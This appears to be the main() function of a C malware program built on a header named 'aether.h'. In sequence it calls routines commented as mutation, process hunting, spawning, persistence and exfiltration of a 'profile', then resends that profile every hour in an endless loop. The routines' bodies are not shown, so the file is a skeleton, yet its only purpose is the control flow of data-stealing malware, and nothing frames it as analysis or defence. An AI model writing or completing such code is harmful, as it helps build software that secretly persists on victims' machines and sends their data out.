#include <aether.h>

/* Entry 0x00 */

int main(void) {    
    /* Mutate */
    mutator();
    
    /* Hunt */
    hunt_procs();
    
    /* Spawn */
    Spawn();

    /* Persiste */
    persist();
    
    /* Exfil */
    sendProfile();
    
    /* Keep it alive, */
    while (1) {
        sleep(3600);  /* Every hour */
        sendProfile();
    }
    
    return 0;
}
